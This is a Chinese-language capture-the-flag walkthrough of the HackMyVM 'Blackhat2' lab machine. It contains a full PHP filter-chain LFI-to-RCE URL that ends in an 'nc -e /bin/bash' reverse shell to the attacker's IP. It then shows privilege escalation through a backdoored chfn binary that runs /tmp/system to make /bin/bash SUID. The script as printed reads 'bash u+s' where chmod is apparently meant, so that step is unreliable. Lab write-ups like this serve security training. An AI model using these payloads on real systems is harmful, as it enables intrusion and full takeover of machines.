# hmv_Blackhat2

**靶机**：[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
**难度**：黄色
**目标 IP**：192.168.205.218
**本机 IP**：192.168.205.141

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
Nmap scan report for 192.168.205.218
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

从 `nmap` 扫描结果来看，目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。接下来，我们对 HTTP 服务进行进一步的目录爆破。

## 2. Web 服务探测与 PHP 过滤器链利用

通过使用 `gobuster` 进行目录爆破，找到了几个有用的路径：

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.218 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 996]
/index.php            (Status: 200) [Size: 996]
/.php                 (Status: 403) [Size: 280]
/news.php             (Status: 200) [Size: 3418]
/2021                 (Status: 200) [Size: 31875]
/2022                 (Status: 200) [Size: 34213]
/2023                 (Status: 200) [Size: 36067]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
```

* `/index.php` 和 `/index.html` 的文件大小相同，没有发现有用的信息。
* `/news.php` 页面要求输入一个邮箱地址。输入一个有效的邮箱后，可以访问到 `/2021`, `/2022`, `/2023` 等新闻页面。

不过，在 `/news.php` 页面中，URL 中有一个异常的地方，提示我们可以尝试利用 **LFI**（本地文件包含）漏洞。

## 3. 利用 PHP Filter 过滤器链

在尝试了 LFI 攻击后，我发现这个页面实际上是可以利用 **PHP 过滤器链** 来执行命令。经过一些思考后，我决定使用 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) 来生成一个过滤器链。该工具帮助我们构建可以通过 `php://filter` 绕过 PHP 的安全限制并执行任意命令的链。

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/synacktiv/php_filter_chain_generator.git
正克隆到 'php_filter_chain_generator'...
...
```

然后，我使用生成的链条来获取反向 shell：

```bash
http://192.168.205.218/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc -e /bin/bash 192.168.205.141 8888
```

## 4. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 5. 提权

在系统中没有发现明显的提权点，但通过 `dpkg -V` 命令查看系统文件的完整性。

```bash
bash-5.2$ dpkg -V
missing   c /etc/apache2/sites-available/000-default.conf
missing   c /etc/apache2/sites-available/default-ssl.conf
??5?????? c /etc/grub.d/10_linux
??5??????   /usr/bin/chfn
```

发现 `/usr/bin/chfn` 被修改，且该文件可能存在提权漏洞。我们将它拖入ida分析一下，我们会发现如下命令字符串：

![image](https://github.com/user-attachments/assets/fe1370ad-f488-4462-a38d-69b1a5acdb3b)
这段字符串表示的是：

```bash
nohup /tmp/system </dev/null >/dev/null 2>&1 &
```

`nohup`：nohup是一个POSIX命令，意思是“不挂断”
`/tmp/system`：恶意脚本

我们可以使用 `chfn` 命令修改 `/bin/bash` ,将它设成我们可以运行的权限，从而获得 root 权限。

```bash
bash-5.2$ vi system
bash-5.2$ cat system 
bash u+s /bin/bash
bash-5.2$ /usr/bin/chfn
Changing the user information for root
Enter the new value, or press ENTER for the default
        Full Name [root]: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
bash-5.2$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
bash-5.2$ bash -p
bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

通过此方式，成功获得了 root 权限。